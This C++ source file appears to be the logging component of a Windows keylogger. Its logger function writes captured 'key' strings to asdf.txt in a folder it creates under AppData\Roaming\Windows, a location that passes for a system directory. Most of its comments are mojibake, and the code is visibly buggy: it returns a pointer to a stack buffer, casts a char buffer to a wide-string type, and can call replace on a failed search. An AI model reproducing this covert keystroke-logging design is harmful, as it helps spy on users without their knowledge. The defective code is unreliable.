#define _CRT_SECURE_NO_WARNINGS
#define ULEN 200
#include "stdafx.h"
#include "filemanager.h"

using namespace std;

time_t t = time(NULL);
struct tm tm = *localtime(&t);
TCHAR username[ULEN] = { 0, };
DWORD usersize = sizeof(username) / sizeof(username[0]);

char* getlogfilename() {
	char time[50] = { 0, };
	sprintf(time, "%d", tm.tm_year);
	char month[10] = { 0, };
	sprintf(month, "%d", tm.tm_mon);
	char day[10] = { 0, };
	sprintf(day, "%d", tm.tm_mday);
	strcat(time, month); 
	strcat(time, day); 
	strcat(time, ".log");
	return time;
}

char* getlogfilepath(const char* filename) {
	GetUserName(LPWSTR(username), &usersize);
	char dirpath[100] = "C:\\Users\\";
	char filepath[100] = "C:\\Users\\";
	static char filename2[100] = { 0, };
	// sprintf(filename2, "%s", filename);
	// PathAppend(LPWSTR(dirpath), LPWSTR(username));
	// PathAppend(LPWSTR(dirpath), L"Appdata\\Roaming\\Windows");
	strcat(dirpath, ConvertWCtoC(username));
	strcat(dirpath, "\\Appdata\\Roaming\\Windows");
	if (PathFileExists(LPWSTR(dirpath))==NULL) {
		_mkdir(dirpath);
	}
	// PathAppend(LPWSTR(filepath), LPWSTR(username));
	// PathAppend(LPWSTR(filepath), L"Appdata\\Roaming\\Windows");
	// PathAppend(LPWSTR(filepath), LPCWSTR(filename));
	strcat(filepath, ConvertWCtoC(username));
	strcat(filepath, "\\Appdata\\Roaming\\Windows");
	strcat(filepath, filename);
	strcpy(filename2,filepath);
	return filename2;
}

void logger(string key) {
	key = key.replace(key.find("'"), 1, "");
	fstream f;
	char ch_key[100] = { 0, };
	strcpy(ch_key, key.c_str());
	f.open(getlogfilepath("\\asdf.txt"));
	f.write(ch_key, sizeof(ch_key));
	f.close();
}

int getfilesize() {
	int rst = 0;
	char path[100] = { 0, };
	strcpy(path, string(getlogfilepath("\\asdf.txt")).c_str());
	FILE* f = NULL;
	if (path == NULL) {
		return rst;
	}
	fopen_s(&f, path, "r");
	if (f != NULL) {
		fseek(f, 0, SEEK_END);
		rst = ftell(f);
		fclose(f);
	}
	return rst;
}

//wchar_t ���� char ���� ����ȯ �Լ�
char* ConvertWCtoC(wchar_t* str)
{
	//��ȯ�� char* ���� ����
	char* pStr;

	//�Է¹��� wchar_t ������ ���̸� ����
	int strSize = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);

	//char* �޸� �Ҵ�
	pStr = new char[strSize];

	//�� ��ȯ
	WideCharToMultiByte(CP_ACP, 0, str, -1, pStr, strSize, 0, 0);

	return pStr;
}

///////////////////////////////////////////////////////////////////////
//char ���� wchar_t ���� ����ȯ �Լ�
wchar_t* ConverCtoWC(char* str)
{
	//wchar_t�� ���� ����
	wchar_t* pStr;
	//��Ƽ ����Ʈ ũ�� ��� ���� ��ȯ
	int strSize = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, NULL);

	//wchar_t �޸� �Ҵ�
	pStr = new WCHAR[strSize];
	//�� ��ȯ
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str) + 1, pStr, strSize);

	return pStr;
}